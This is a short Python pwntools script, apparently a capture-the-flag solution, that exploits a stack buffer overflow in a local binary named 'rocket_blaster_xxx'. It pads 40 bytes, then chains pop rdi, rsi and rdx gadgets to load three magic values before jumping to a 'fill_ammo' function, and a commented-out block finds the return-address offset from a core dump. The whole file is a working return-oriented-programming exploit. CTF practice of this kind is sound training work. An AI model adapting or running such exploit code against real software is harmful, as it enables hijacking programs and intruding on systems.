import pwn

fill_ammo = 0x00000000004012f5
pop_rdi_ret = 0x000000000040159f
pop_rsi_ret = 0x000000000040159d
pop_rdx_ret = 0x000000000040159b
ret = 0x000000000040101a

proc = pwn.process('./rocket_blaster_xxx')

payload = pwn.cyclic (40) + pwn.p64(pop_rdi_ret) + pwn.p64(0xDEADBEEF) + pwn.p64 (pop_rsi_ret) + pwn.p64 (0xDEADBABE) + pwn.p64 (pop_rdx_ret) + pwn.p64 (0xDEAD1337) + pwn.p64(ret) + pwn.p64(fill_ammo)

proc.clean()
proc.sendline (payload)
print (proc.clean ())

file = open ('input' , 'wb')
file.write (payload)
file.close()

'''
stack = core.rsp
pwn.info ('rsp = %#x', stack)

pattern = core.read (stack, 4)
rip_offset = pwn.cyclic_find (pattern)
pwn.info ('rip offset is %d', rip_offset)
'''
